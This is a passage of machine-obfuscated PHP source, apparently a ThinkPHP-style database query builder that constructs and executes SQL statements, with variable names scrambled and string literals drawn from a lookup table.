$this->parseKey($çÅƒûşŸ) . $ª÷Õæ‹‚[508] . $Ğş·ıˆ[1]; } elseif (is_scalar($Ğş·ıˆ) || is_null($Ğş·ıˆ)) { $ËÏİŞ¸[] = $this->parseKey($çÅƒûşŸ) . $ª÷Õæ‹‚[508] . $this->parseValue($Ğş·ıˆ); } } return $ª÷Õæ‹‚[1070] . implode($ª÷Õæ‹‚[50], $ËÏİŞ¸); } protected function bindParam($ÑÕâ·½ƒ, $è¬É¼ëê) { $this->bind[$_SERVER[°‰†òö¯][4] . $ÑÕâ·½ƒ] = $è¬É¼ëê; } protected function parseBind($ü¡Éèí¢) { $ü¡Éèí¢ = array_merge($this->bind, $ü¡Éèí¢); $this->bind = array(); return $ü¡Éèí¢; } function parseKey(&$‡í•å‰ä, $åôÏö‚ = true) { if ($åôÏö‚) { $‡í•å‰ä = $this->parseKeyCheck($‡í•å‰ä); } return $‡í•å‰ä; } function parseKeyCheck($Ú‹ÛÆôĞ) { $ä­ î“º =& $_SERVER[°‰†òö¯]; $Ú‹ÛÆôĞ = trim($Ú‹ÛÆôĞ); if (!preg_match($ä­ î“º[1071], $Ú‹ÛÆôĞ)) { think_exception($ä­ î“º[1072] . $Ú‹ÛÆôĞ); } return $Ú‹ÛÆôĞ; } protected function parseValue($ú›‡ˆæó) { $–£³ÜÅ =& $_SERVER[°‰†òö¯]; if (is_string($ú›‡ˆæó)) { $ú›‡ˆæó = $–£³ÜÅ[1030] . $this->escapeString($ú›‡ˆæó) . $–£³ÜÅ[1030]; } elseif (isset($ú›‡ˆæó[0]) && is_string($ú›‡ˆæó[0]) && strtolower($ú›‡ˆæó[0]) == $–£³ÜÅ[374]) { $ú›‡ˆæó = $this->escapeString($ú›‡ˆæó[1]); } elseif (is_array($ú›‡ˆæó)) { $ú›‡ˆæó = array_map(array($this, $–£³ÜÅ[1031]), $ú›‡ˆæó); } elseif (is_bool($ú›‡ˆæó)) { $ú›‡ˆæó = $ú›‡ˆæó ? $–£³ÜÅ[91] : $–£³ÜÅ[230]; } elseif (is_null($ú›‡ˆæó)) { $ú›‡ˆæó = $–£³ÜÅ[106]; } return $ú›‡ˆæó; } protected function parseField($Ôôó´¯ù) { $Ü›Ç˜Ìˆ =& $_SERVER[°‰†òö¯]; if (is_string($Ôôó´¯ù) && strpos($Ôôó´¯ù, $Ü›Ç˜Ìˆ[50])) { $Ôôó´¯ù = explode($Ü›Ç˜Ìˆ[50], $Ôôó´¯ù); } if (is_array($Ôôó´¯ù)) { $ˆßÚ‰ÓÔ = array(); foreach ($Ôôó´¯ù as $íºñ„Óæ => $é±°·È) { if (!is_numeric($íºñ„Óæ)) { $ˆßÚ‰ÓÔ[] = $this->parseKey($íºñ„Óæ, !1) . $Ü›Ç˜Ìˆ[1073] . $this->parseKey($é±°·È); } else { $ˆßÚ‰ÓÔ[] = $this->parseKey($é±°·È); } } $¾È­Ü¿ = implode($Ü›Ç˜Ìˆ[50], $ˆßÚ‰ÓÔ); } elseif (is_string($Ôôó´¯ù) && !empty($Ôôó´¯ù)) { $¾È­Ü¿ = $Ôôó´¯ù; } else { $¾È­Ü¿ = $Ü›Ç˜Ìˆ[222]; } return $¾È­Ü¿; } protected function parseTable($×½Š“ˆö) { $È…öËË› =& $_SERVER[°‰†òö¯]; if (is_array($×½Š“ˆö)) { $êœçÁÔß = array(); foreach ($×½Š“ˆö as $ÚüÇ¦ÀØ => $¶–ÀÙ‹´) { if (!is_numeric($ÚüÇ¦ÀØ)) { $êœçÁÔß[] = $this->parseKey($ÚüÇ¦ÀØ) . $È…öËË›[53] . $this->parseKey($¶–ÀÙ‹´); } else { $êœçÁÔß[] = $this->parseKey($ÚüÇ¦ÀØ); } } $×½Š“ˆö = $êœçÁÔß; } elseif (is_string($×½Š“ˆö)) { if (strstr($×½Š“ˆö, $È…öËË›[53])) { return $×½Š“ˆö; } $×½Š“ˆö = explode($È…öËË›[50], $×½Š“ˆö); array_walk($×½Š“ˆö, array($this, $È…öËË›[979])); } return $È…öËË›[973] . trim(implode($È…öËË›[1074], $×½Š“ˆö), $È…öËË›[463]) . $È…öËË›[973]; } protected function parseWhere($¦‘ÆØÊ§) { $²ÒÙ¤ò =& $_SERVER[°‰†òö¯]; $¯œó°ÈÂ = $²ÒÙ¤ò[12]; if (is_string($¦‘ÆØÊ§)) { $¯œó°ÈÂ = $¦‘ÆØÊ§; } else { $ñ—Û¾«´ = isset($¦‘ÆØÊ§[$²ÒÙ¤ò[1075]]) ? strtoupper($¦‘ÆØÊ§[$²ÒÙ¤ò[1075]]) : $²ÒÙ¤ò[12]; if (in_array($ñ—Û¾«´, array($²ÒÙ¤ò[1076], $²ÒÙ¤ò[1077], $²ÒÙ¤ò[1078]))) { $ñ—Û¾«´ = $²ÒÙ¤ò[53] . $ñ—Û¾«´ . $²ÒÙ¤ò[53]; unset($¦‘ÆØÊ§[$²ÒÙ¤ò[1075]]); } else { $ñ—Û¾«´ = $²ÒÙ¤ò[1079]; } foreach ($¦‘ÆØÊ§ as $úûĞ€œ½ => $¨ÕÂ¡ú·) { $¯œó°ÈÂ .= $²ÒÙ¤ò[356]; if (is_numeric($úûĞ€œ½)) { $úûĞ€œ½ = $²ÒÙ¤ò[1080]; } if (0 === strpos($úûĞ€œ½, $²ÒÙ¤ò[11])) { $¯œó°ÈÂ .= $this->parseThinkWhere($úûĞ€œ½, $¨ÕÂ¡ú·); } else { if (!preg_match($²ÒÙ¤ò[1081], trim($úûĞ€œ½))) { think_exception(think_lang($²ÒÙ¤ò[1082]) . $²ÒÙ¤ò[4] . $úûĞ€œ½); } $Š‹Ú•¹ = is_array($¨ÕÂ¡ú·) && isset($¨ÕÂ¡ú·[$²ÒÙ¤ò[1083]]); $úûĞ€œ½ = trim($úûĞ€œ½); if (strpos($úûĞ€œ½, $²ÒÙ¤ò[214])) { $¸éêİñÙ = explode($²ÒÙ¤ò[214], $úûĞ€œ½); $…àÔíÔ‡ = array(); foreach ($¸éêİñÙ as $ß’ì“ËÚ => $Ë¦¿Ê÷) { $¡®ÊŞÒ¢ = $Š‹Ú•¹ ? $¨ÕÂ¡ú·[$ß’ì“ËÚ] : $¨ÕÂ¡ú·; $…àÔíÔ‡[] = $²ÒÙ¤ò[339] . $this->parseWhereItem($this->parseKey($Ë¦¿Ê÷), $¡®ÊŞÒ¢) . $²ÒÙ¤ò[978]; } $¯œó°ÈÂ .= implode($²ÒÙ¤ò[1084], $…àÔíÔ‡); } elseif (strpos($úûĞ€œ½, $²ÒÙ¤ò[286])) { $¸éêİñÙ = explode($²ÒÙ¤ò[286], $úûĞ€œ½); $…àÔíÔ‡ = array(); foreach ($¸éêİñÙ as $ß’ì“ËÚ => $Ë¦¿Ê÷) { $¡®ÊŞÒ¢ = $Š‹Ú•¹ ? $¨ÕÂ¡ú·[$ß’ì“ËÚ] : $¨ÕÂ¡ú·; $…àÔíÔ‡[] = $²ÒÙ¤ò[339] . $this->parseWhereItem($this->parseKey($Ë¦¿Ê÷), $¡®ÊŞÒ¢) . $²ÒÙ¤ò[978]; } $¯œó°ÈÂ .= implode($²ÒÙ¤ò[1079], $…àÔíÔ‡); } else { $¯œó°ÈÂ .= $this->parseWhereItem($this->parseKey($úûĞ€œ½), $¨ÕÂ¡ú·); } } $¯œó°ÈÂ .= $²ÒÙ¤ò[357] . $ñ—Û¾«´; } $¯œó°ÈÂ = substr($¯œó°ÈÂ, 0, -strlen($ñ—Û¾«´)); } return empty($¯œó°ÈÂ) ? $²ÒÙ¤ò[12] : $²ÒÙ¤ò[1085] . $¯œó°ÈÂ; } protected function parseWhereItem($á›³Ë€ˆ, $–öšõö) { $Ğ‘­µäø =& $_SERVER[°‰†òö¯]; $®®ñïûÈ = $Ğ‘­µäø[12]; if (is_array($–öšõö)) { if (is_string($–öšõö[0])) { $Ïû¯¸š = strtolower($–öšõö[0]); if (in_array($–öšõö[0], array($Ğ‘­µäø[508], $Ğ‘­µäø[1086], $Ğ‘­µäø[1087], $Ğ‘­µäø[1088], $Ğ‘­µäø[1089], $Ğ‘­µäø[1090]))) { $®®ñïûÈ .= $á›³Ë€ˆ . $Ğ‘­µäø[53] . $–öšõö[0] . $Ğ‘­µäø[53] . $this->parseValue($–öšõö[1]); } elseif (preg_match($Ğ‘­µäø[1091], $–öšõö[0])) { $®®ñïûÈ .= $á›³Ë€ˆ . $Ğ‘­µäø[53] . $this->exp[$Ïû¯¸š] . $Ğ‘­µäø[53] . $this->parseValue($–öšõö[1]); } elseif (preg_match($Ğ‘­µäø[1092], $–öšõö[0])) { if (is_array($–öšõö[1])) { $Î«­œÊ = isset($–öšõö[2]) ? strtoupper($–öšõö[2]) : $Ğ‘­µäø[1077]; if (in_array($Î«­œÊ, array($Ğ‘­µäø[1076], $Ğ‘­µäø[1077], $Ğ‘­µäø[1078]))) { $Š¡ØÎÂ‘ = array(); foreach ($–öšõö[1] as $¤óš”õ™) { $Š¡ØÎÂ‘[] = $á›³Ë€ˆ . $Ğ‘­µäø[53] . $this->exp[$Ïû¯¸š] . $Ğ‘­µäø[53] . $this->parseValue($¤óš”õ™); } $®®ñïûÈ .= $Ğ‘­µäø[339] . implode($Ğ‘­µäø[53] . $Î«­œÊ . $Ğ‘­µäø[53], $Š¡ØÎÂ‘) . $Ğ‘­µäø[978]; } } else { $®®ñïûÈ .= $á›³Ë€ˆ . $Ğ‘­µäø[53] . $this->exp[$Ïû¯¸š] . $Ğ‘­µäø[53] . $this->parseValue($–öšõö[1]); } } elseif ($Ğ‘­µäø[374] == $Ïû¯¸š) { $®®ñïûÈ .= $Ğ‘­µäø[976] . $á›³Ë€ˆ . $Ğ‘­µäø[53] . $–öšõö[1] . $Ğ‘­µäø[1093]; } elseif (preg_match($Ğ‘­µäø[1094], $–öšõö[0])) { $®®ñïûÈ .= $–öšõö[0]; } elseif (preg_match($Ğ‘­µäø[1095], $–öšõö[0])) { if (isset($–öšõö[2]) && $Ğ‘­µäø[374] == $–öšõö[2]) { $®®ñïûÈ .= $á›³Ë€ˆ . $Ğ‘­µäø[53] . $this->exp[$Ïû¯¸š] . $Ğ‘­µäø[53] . $–öšõö[1]; } else { if (is_string($–öšõö[1])) { $–öšõö[1] = explode($Ğ‘­µäø[50], $–öšõö[1]); } $›¾Æñ¿ß = implode($Ğ‘­µäø[50], $this->parseValue($–öšõö[1])); $®®ñïûÈ .= $á›³Ë€ˆ . $Ğ‘­µäø[53] . $this->exp[$Ïû¯¸š] . $Ğ‘­µäø[976] . $›¾Æñ¿ß . $Ğ‘­µäø[978]; } } elseif (preg_match($Ğ‘­µäø[1096], $–öšõö[0])) { $«úğ‡ = is_string($–öšõö[1]) ? explode($Ğ‘­µäø[50], $–öšõö[1]) : $–öšõö[1]; $®®ñïûÈ .= $Ğ‘­µäø[976] . $á›³Ë€ˆ . $Ğ‘­µäø[53] . $this->exp[$Ïû¯¸š] . $Ğ‘­µäø[53] . $this->parseValue($«úğ‡[0]) . $Ğ‘­µäø[1079] . $this->parseValue($«úğ‡[1]) . $Ğ‘­µäø[357]; } else { think_exception(think_lang($Ğ‘­µäø[1082]) . $Ğ‘­µäø[4] . $–öšõö[0]); } } else { $Ò„­—Ï = count($–öšõö); $¼»ØÒˆó = $Ğ‘­µäø[12]; if (is_string($–öšõö[$Ò„­—Ï - 1])) { $¼»ØÒˆó = isset($–öšõö[$Ò„­—Ï - 1]) ? strtoupper($–öšõö[$Ò„­—Ï - 1]) : $Ğ‘­µäø[12]; if (in_array($¼»ØÒˆó, array($Ğ‘­µäø[1076], $Ğ‘­µäø[1077], $Ğ‘­µäø[1078]))) { $Ò„­—Ï = $Ò„­—Ï - 1; } } else { $¼»ØÒˆó = $Ğ‘­µäø[1076]; } for ($‡ŒïÃìß = 0; $‡ŒïÃìß < $Ò„­—Ï; $‡ŒïÃìß++) { $«úğ‡ = is_array($–öšõö[$‡ŒïÃìß]) ? $–öšõö[$‡ŒïÃìß][1] : $–öšõö[$‡ŒïÃìß]; if ($Ğ‘­µäø[374] == strtolower($–öšõö[$‡ŒïÃìß][0])) { $®®ñïûÈ .= $Ğ‘­µäø[339] . $á›³Ë€ˆ . $Ğ‘­µäø[53] . $«úğ‡ . $Ğ‘­µäø[1093] . $¼»ØÒˆó . $Ğ‘­µäø[53]; } else { $»¦¬„Ã“ = is_array($–öšõö[$‡ŒïÃìß]) ? $this->exp[strtolower($–öšõö[$‡ŒïÃìß][0])] : $Ğ‘­µäø[508]; if (!$»¦¬„Ã“ && is_array($–öšõö[$‡ŒïÃìß]) && in_array($–öšõö[$‡ŒïÃìß][0], array($Ğ‘­µäø[508], $Ğ‘­µäø[1086], $Ğ‘­µäø[1087], $Ğ‘­µäø[1088], $Ğ‘­µäø[1089], $Ğ‘­µäø[1090]))) { $»¦¬„Ã“ = $–öšõö[$‡ŒïÃìß][0]; } $®®ñïûÈ .= $Ğ‘­µäø[339] . $á›³Ë€ˆ . $Ğ‘­µäø[53] . $»¦¬„Ã“ . $Ğ‘­µäø[53] . $this->parseValue($«úğ‡) . $Ğ‘­µäø[1093] . $¼»ØÒˆó . $Ğ‘­µäø[53]; } } $®®ñïûÈ = substr($®®ñïûÈ, 0, -4); } } else { $®®ñïûÈ .= $á›³Ë€ˆ . $Ğ‘­µäø[1097] . $this->parseValue($–öšõö); } return $®®ñïûÈ; } protected function parseThinkWhere($ÍˆÔé“´, $‘ôá®õË) { $¬ˆïÕä =& $_SERVER[°‰†òö¯]; $ùšÙÏĞ = $¬ˆïÕä[12]; switch ($ÍˆÔé“´) { case $¬ˆïÕä[429]: $ùšÙÏĞ = $‘ôá®õË; break; case $¬ˆïÕä[1080]: $ùšÙÏĞ = is_string($‘ôá®õË) ? $‘ôá®õË : substr($this->parseWhere($‘ôá®õË), 6); break; case $¬ˆïÕä[1098]: parse_str($‘ôá®õË, $ş¹¹™ı); if (isset($ş¹¹™ı[$¬ˆïÕä[1075]])) { $Ôàå“Ş¹ = $¬ˆïÕä[53] . strtoupper($ş¹¹™ı[$¬ˆïÕä[1075]]) . $¬ˆïÕä[53]; unset($ş¹¹™ı[$¬ˆïÕä[1075]]); } else { $Ôàå“Ş¹ = $¬ˆïÕä[1079]; } $àíÂœ‹Ÿ = array(); foreach ($ş¹¹™ı as $¶ÌèÉ‹¯ => $’æş„ëÕ) { $àíÂœ‹Ÿ[] = $this->parseKey($¶ÌèÉ‹¯) . $¬ˆïÕä[1097] . $this->parseValue($’æş„ëÕ); } $ùšÙÏĞ = implode($Ôàå“Ş¹, $àíÂœ‹Ÿ); break; } return $ùšÙÏĞ; } protected function parseLimit($‡‰Æ¹) { $¿ŞÜ¿¸Ÿ =& $_SERVER[°‰†òö¯]; return !empty($‡‰Æ¹) ? $¿ŞÜ¿¸Ÿ[51] . $‡‰Æ¹ . $¿ŞÜ¿¸Ÿ[53] : $¿ŞÜ¿¸Ÿ[12]; } protected function parseJoin($À‡öøåÛ) { $¦Ë¸šÌˆ =& $_SERVER[°‰†òö¯]; $Ñ±¤©È­ = $¦Ë¸šÌˆ[12]; if (!empty($À‡öøåÛ)) { if (is_array($À‡öøåÛ)) { foreach ($À‡öøåÛ as $ÎÕó’‡ => $¹Ô„«ŞÚ) { if (!1 !== stripos($¹Ô„«ŞÚ, $¦Ë¸šÌˆ[1099])) { $Ñ±¤©È­ .= $¦Ë¸šÌˆ[53] . $¹Ô„«ŞÚ; } else { $Ñ±¤©È­ .= $¦Ë¸šÌˆ[1100] . $¹Ô„«ŞÚ; } } } else { $Ñ±¤©È­ .= $¦Ë¸šÌˆ[1100] . $À‡öøåÛ; } } $Ñ±¤©È­ = preg_replace($¦Ë¸šÌˆ[1101], think_config($¦Ë¸šÌˆ[1003]) . $¦Ë¸šÌˆ[1102], $Ñ±¤©È­); return $Ñ±¤©È­; } protected function parseOrder($õÊÖíÉ‰) { $¢±è²ª‡ =& $_SERVER[°‰†òö¯]; if (is_array($õÊÖíÉ‰)) { $Æ€ÇÛ— = array(); foreach ($õÊÖíÉ‰ as $·¯á†üú => $å‡¸Ç€¸) { if (is_numeric($·¯á†üú)) { $Æ€ÇÛ—[] = $this->parseKey($å‡¸Ç€¸); } else { $å‡¸Ç€¸ = in_array(strtoupper(trim($å‡¸Ç€¸)), array($¢±è²ª‡[1103], $¢±è²ª‡[1104])) ? $¢±è²ª‡[53] . $å‡¸Ç€¸ : $¢±è²ª‡[12]; if (preg_match($¢±è²ª‡[1105], $·¯á†üú)) { $Æ€ÇÛ—[] = $this->parseKey($·¯á†üú) . $å‡¸Ç€¸; } else { think_exception($¢±è²ª‡[1106] . $·¯á†üú); } } } $õÊÖíÉ‰ = implode($¢±è²ª‡[50], $Æ€ÇÛ—); } return !empty($õÊÖíÉ‰) ? $¢±è²ª‡[1107] . $õÊÖíÉ‰ : $¢±è²ª‡[12]; } protected function parseGroup($İğŞÒòê) { $µºèÑë‹ =& $_SERVER[°‰†òö¯]; return !empty($İğŞÒòê) ? $µºèÑë‹[1108] . $İğŞÒòê : $µºèÑë‹[12]; } protected function parseHaving($è«¸¾¡) { $üñè‘Í =& $_SERVER[°‰†òö¯]; return !empty($è«¸¾¡) ? $üñè‘Í[1109] . $è«¸¾¡ : $üñè‘Í[12]; } protected function parseComment($îÍ”êëü) { $¿¿áú±Å =& $_SERVER[°‰†òö¯]; return !empty($îÍ”êëü) ? $¿¿áú±Å[1110] . $îÍ”êëü . $¿¿áú±Å[1111] : $¿¿áú±Å[12]; } protected function parseDistinct($Š“ËĞ†®) { $‰»…º˜¢ =& $_SERVER[°‰†òö¯]; return !empty($Š“ËĞ†®) ? $‰»…º˜¢[1112] : $‰»…º˜¢[12]; } protected function parseUnion($Í°©º) { $µ•‚“°õ =& $_SERVER[°‰†òö¯]; if (empty($Í°©º)) { return $µ•‚“°õ[12]; } if (isset($Í°©º[$µ•‚“°õ[425]])) { $‘ç•ÆÜ = $µ•‚“°õ[1113]; unset($Í°©º[$µ•‚“°õ[425]]); } else { $‘ç•ÆÜ = $µ•‚“°õ[1114]; } foreach ($Í°©º as $“âşû¶à) { $ïşşèÜè[] = $‘ç•ÆÜ . (is_array($“âşû¶à) ? $this->buildSelectSql($“âşû¶à) : $“âşû¶à); } return implode($µ•‚“°õ[53], $ïşşèÜè); } public function insert($¼ÈÆü—, $ª®ö€© = array(), $Öşƒû« = false) { $›´¥†Š… =& $_SERVER[°‰†òö¯]; $éù‚‰µ = $õ÷ÎŞÖ = array(); $this->model = $ª®ö€©[$›´¥†Š…[360]]; foreach ($¼ÈÆü— as $üì¢öÜ€ => $ä›ìÈØï) { if (is_array($ä›ìÈØï) && $›´¥†Š…[374] == $ä›ìÈØï[0]) { $õ÷ÎŞÖ[] = $this->parseKey($üì¢öÜ€); $éù‚‰µ[] = $ä›ìÈØï[1]; } elseif (is_scalar($ä›ìÈØï) || is_null($ä›ìÈØï)) { $õ÷ÎŞÖ[] = $this->parseKey($üì¢öÜ€); $éù‚‰µ[] = $this->parseValue($ä›ìÈØï); } } $‰‰†™Ö = ($Öşƒû« ? $›´¥†Š…[980] : $›´¥†Š…[981]) . $›´¥†Š…[982] . $this->parseTable($ª®ö€©[$›´¥†Š…[358]]) . $›´¥†Š…[976] . implode($›´¥†Š…[50], $õ÷ÎŞÖ) . $›´¥†Š…[977] . implode($›´¥†Š…[50], $éù‚‰µ) . $›´¥†Š…[978]; $‰‰†™Ö .= $this->parseLock(isset($ª®ö€©[$›´¥†Š…[910]]) ? $ª®ö€©[$›´¥†Š…[910]] : !1); $‰‰†™Ö .= $this->parseComment(!empty($ª®ö€©[$›´¥†Š…[431]]) ? $ª®ö€©[$›´¥†Š…[431]] : $›´¥†Š…[12]); return $this->execute($‰‰†™Ö, $this->parseBind(!empty($ª®ö€©[$›´¥†Š…[362]]) ? $ª®ö€©[$›´¥†Š…[362]] : array())); } public function selectInsert($‰°¥ÄéË, $Ì¿ïšñ§, $ïÈñ üÈ = array()) { $¯–†ğÄ =& $_SERVER[°‰†òö¯]; $this->model = $ïÈñ üÈ[$¯–†ğÄ[360]]; if (is_string($‰°¥ÄéË)) { $‰°¥ÄéË = explode($¯–†ğÄ[50], $‰°¥ÄéË); } array_walk($‰°¥ÄéË, array($this, $¯–†ğÄ[979])); $˜ØõĞ¬Ä = $¯–†ğÄ[1115] . $this->parseTable($Ì¿ïšñ§) . $¯–†ğÄ[976] . implode($¯–†ğÄ[50], $‰°¥ÄéË) . $¯–†ğÄ[1093]; $˜ØõĞ¬Ä .= $this->buildSelectSql($ïÈñ üÈ); return $this->execute($˜ØõĞ¬Ä, $this->parseBind(!empty($ïÈñ üÈ[$¯–†ğÄ[362]]) ? $ïÈñ üÈ[$¯–†ğÄ[362]] : array())); } public function update($ú¼Ù¦½ú, $®”‘Ñ·) { $µ³û¤ßé =& $_SERVER[°‰†òö¯]; $this->model = $®”‘Ñ·[$µ³û¤ßé[360]]; $Ï‰ØŠ»  = $µ³û¤ßé[1116] . $this->parseTable($®”‘Ñ·[$µ³û¤ßé[358]]) . $this->parseSet($ú¼Ù¦½ú) . $this->parseWhere(!empty($®”‘Ñ·[$µ³û¤ßé[354]]) ? $®”‘Ñ·[$µ³û¤ßé[354]] : $µ³û¤ßé[12]) . $this->parseOrder(!empty($®”‘Ñ·[$µ³û¤ßé[443]]) ? $®”‘Ñ·[$µ³û¤ßé[443]] : $µ³û¤ßé[12]) . $this->parseLimit(!empty($®”‘Ñ·[$µ³û¤ßé[369]]) ? $®”‘Ñ·[$µ³û¤ßé[369]] : $µ³û¤ßé[12]) . $this->parseLock(isset($®”‘Ñ·[$µ³û¤ßé[910]]) ? $®”‘Ñ·[$µ³û¤ßé[910]] : !1) . $this->parseComment(!empty($®”‘Ñ·[$µ³û¤ßé[431]]) ? $®”‘Ñ·[$µ³û¤ßé[431]] : $µ³û¤ßé[12]); return $this->execute($Ï‰ØŠ» , $this->parseBind(!empty($®”‘Ñ·[$µ³û¤ßé[362]]) ? $®”‘Ñ·[$µ³û¤ßé[362]] : array())); } public function delete($©µ¨¹ûŞ = array()) { $ö÷òÌ¸ =& $_SERVER[°‰†òö¯]; $this->model = $©µ¨¹ûŞ[$ö÷òÌ¸[360]]; $¼ õ©Å÷ = $ö÷òÌ¸[1117] . $this->parseTable($©µ¨¹ûŞ[$ö÷òÌ¸[358]]) . $this->parseWhere(!empty($©µ¨¹ûŞ[$ö÷òÌ¸[354]]) ? $©µ¨¹ûŞ[$ö÷òÌ¸[354]] : $ö÷òÌ¸[12]) . $this->parseOrder(!empty($©µ¨¹ûŞ[$ö÷òÌ¸[443]]) ? $©µ¨¹ûŞ[$ö÷òÌ¸[443]] : $ö÷òÌ¸[12]) . $this->parseLimit(!empty($©µ¨¹ûŞ[$ö÷òÌ¸[369]]) ? $©µ¨¹ûŞ[$ö÷òÌ¸[369]] : $ö÷òÌ¸[12]) . $this->parseLock(isset($©µ¨¹ûŞ[$ö÷òÌ¸[910]]) ? $©µ¨¹ûŞ[$ö÷òÌ¸[910]] : !1) . $this->parseComment(!empty($©µ¨¹ûŞ[$ö÷òÌ¸[431]]) ? $©µ¨¹ûŞ[$ö÷òÌ¸[431]] : $ö÷òÌ¸[12]); return $this->execute($¼ õ©Å÷, $this->parseBind(!empty($©µ¨¹ûŞ[$ö÷òÌ¸[362]]) ? $©µ¨¹ûŞ[$ö÷òÌ¸[362]] : array())); } public function select($ßô‚§Œ¼ = array()) { $‹•œ›ÎÁ =& $_SERVER[°‰†òö¯]; $this->model = $ßô‚§Œ¼[$‹•œ›ÎÁ[360]]; $Œ¨æùÀŠ = $this->buildSelectSql($ßô‚§Œ¼); $›É™…¿ = isset($ßô‚§Œ¼[$‹•œ›ÎÁ[426]]) ? $ßô‚§Œ¼[$‹•œ›ÎÁ[426]] : !1; if ($›É™…¿) { $ƒçååÍÌ = is_string($›É™…¿[$‹•œ›ÎÁ[97]]) ? $›É™…¿[$‹•œ›ÎÁ[97]] : $‹•œ›ÎÁ[1118] . md5($Œ¨æùÀŠ); $œ´¼ÕÌÌ = think_cache($ƒçååÍÌ, $‹•œ›ÎÁ[12], $›É™…¿); if (!1 !== $œ´¼ÕÌÌ) { return $œ´¼ÕÌÌ; } } $ùÃ¬…ì¶ = $this->query($Œ¨æùÀŠ, $this->parseBind(!empty($ßô‚§Œ¼[$‹•œ›ÎÁ[362]]) ? $ßô‚§Œ¼[$‹•œ›ÎÁ[362]] : array())); if ($›É™…¿ && !1 !== $ùÃ¬…ì¶) { think_cache($ƒçååÍÌ, $ùÃ¬…ì¶, $›É™…¿); } return $ùÃ¬…ì¶; } public function buildSelectSql($ø¦Ö¬¾ê = array()) { $ÏÚŠèå =& $_SERVER[°‰†òö¯]; if (isset($ø¦Ö¬¾ê[$ÏÚŠèå[430]])) { if (strpos($ø¦Ö¬¾ê[$ÏÚŠèå[430]], $ÏÚŠèå[50])) { list($ù®ş›íÃ, $£Û×”µ§) = explode($ÏÚŠèå[50], $ø¦Ö¬¾ê[$ÏÚŠèå[430]]); } else { $ù®ş›íÃ = $ø¦Ö¬¾ê[$ÏÚŠèå[430]]; } $ù®ş›íÃ = $ù®ş›íÃ ? $ù®ş›íÃ : 1; $£Û×”µ§ = isset($£Û×”µ§) ? $£Û×”µ§ : (is_numeric($ø¦Ö¬¾ê[$ÏÚŠèå[369]]) ? $ø¦Ö¬¾ê[$ÏÚŠèå[369]] : 20); $‚†ÅÛ¿ï = $£Û×”µ§ * ((int) $ù®ş›íÃ - 1); $ø¦Ö¬¾ê[$ÏÚŠèå[369]] = $‚†ÅÛ¿ï . $ÏÚŠèå[50] . $£Û×”µ§; } if (think_config($ÏÚŠèå[1119])) { $ı¢ï–Ñö = $ÏÚŠèå[1120] . md5(serialize($ø¦Ö¬¾ê)); $¿Êª—ùì = think_cache($ı¢ï–Ñö); if ($¿Êª—ùì) { return $¿Êª—ùì; } } $Ÿê«Çß = $this->parseSql($this->selectSql, $ø¦Ö¬¾ê); $Ÿê«Çß .= $this->parseLock(isset($ø¦Ö¬¾ê[$ÏÚŠèå[910]]) ? $ø¦Ö¬¾ê[$ÏÚŠèå[910]] : !1); if (isset($ı¢ï–Ñö)) { think_cache($ı¢ï–Ñö, $Ÿê«Çß); } return $Ÿê«Çß; } public function parseSql($³™ÂŒå™, $¦‰šï¼» = array()) { $†•¨éÇõ =& $_SERVER[°‰†òö¯]; $³™ÂŒå™ = str_replace(array($†•¨éÇõ[1121], $†•¨éÇõ[1122], $†•¨éÇõ[1123], $†•¨éÇõ[1124], $†•¨éÇõ[1125], $†•¨éÇõ[1126], $†•¨éÇõ[1127], $†•¨éÇõ[1128], $†•¨éÇõ[1129], $†•¨éÇõ[1130], $†•¨éÇõ[1131]), array($this->parseTable("{$¦‰šï¼»[$†•¨éÇõ[358]]}"), $this->parseDistinct(isset($¦‰šï¼»[$†•¨éÇõ[1132]]) ? $¦‰šï¼»[$†•¨éÇõ[1132]] : !1), $this->parseField(!empty($¦‰šï¼»[$†•¨éÇõ[352]]) ? $¦‰šï¼»[$†•¨éÇõ[352]] : $†•¨éÇõ[222]), $this->parseJoin(!empty($¦‰šï¼»[$†•¨éÇõ[361]]) ? $¦‰šï¼»[$†•¨éÇõ[361]] : $†•¨éÇõ[12]), $this->parseWhere(!empty($¦‰šï¼»[$†•¨éÇõ[354]]) ? $¦‰šï¼»[$†•¨éÇõ[354]] : $†•¨éÇõ[12]), $this->parseGroup(!empty($¦‰šï¼»[$†•¨éÇõ[582]]) ? $¦‰šï¼»[$†•¨éÇõ[582]] : $†•¨éÇõ[12]), $this->parseHaving(!empty($¦‰šï¼»[$†•¨éÇõ[1133]]) ? $¦‰šï¼»[$†•¨éÇõ[1133]] : $†•¨éÇõ[12]), $this->parseOrder(!empty($¦‰šï¼»[$†•¨éÇõ[443]]) ? $¦‰šï¼»[$†•¨éÇõ[443]] : $†•¨éÇõ[12]), $this->parseLimit(!empty($¦‰šï¼»[$†•¨éÇõ[369]]) ? $¦‰šï¼»[$†•¨éÇõ[369]] : $†•¨éÇõ[12]), $this->parseUnion(!empty($¦‰šï¼»[$†•¨éÇõ[424]]) ? $¦‰šï¼»[$†•¨éÇõ[424]] : $†•¨éÇõ[12]), $this->parseComment(!empty($¦‰šï¼»[$†•¨éÇõ[431]]) ? $¦‰šï¼»[$†•¨éÇõ[431]] : $†•¨éÇõ[12])), $³™ÂŒå™); return $³™ÂŒå™; } public function getLastSql($¥ÓÖñç¬ = '') { return $¥ÓÖñç¬ ? $this->modelSql[$¥ÓÖñç¬] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($É‘ãç—¬) { return addslashes($É‘ãç—¬); } public function setModel($ê¸Úõ­Ó) { $this->model = $ê¸Úõ­Ó; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($É—¦Ï‚¾ = array()) { $ûÛÓ€× =& $_SERVER[°‰†òö¯]; if (empty($É—¦Ï‚¾)) { $É—¦Ï‚¾ = $GLOBALS[$ûÛÓ€×[6]][$ûÛÓ€×[21]]; } $this->database = $É—¦Ï‚¾; } public function model($ù×ÔÔÜ = '') { return new ModelBase($ù×ÔÔÜ, $_SERVER[°‰†òö¯][12], $this->database); } public function db($ÎÍŒ›ğ¡ = false) { $î®ÃÒ® =& $_SERVER[°‰†òö¯]; $–´øÑÌ = array_change_key_case($this->database); if ($this->dbType() == $î®ÃÒ®[13] || !$ÎÍŒ›ğ¡) { return $this->model()->db(); } $è¨ûÜŒã = $–´øÑÌ[$î®ÃÒ®[1047]]; $–´øÑÌ[$î®ÃÒ®[1047]] = $î®ÃÒ®[12]; if ($–´øÑÌ[$î®ÃÒ®[1042]] == $î®ÃÒ®[1039]) { 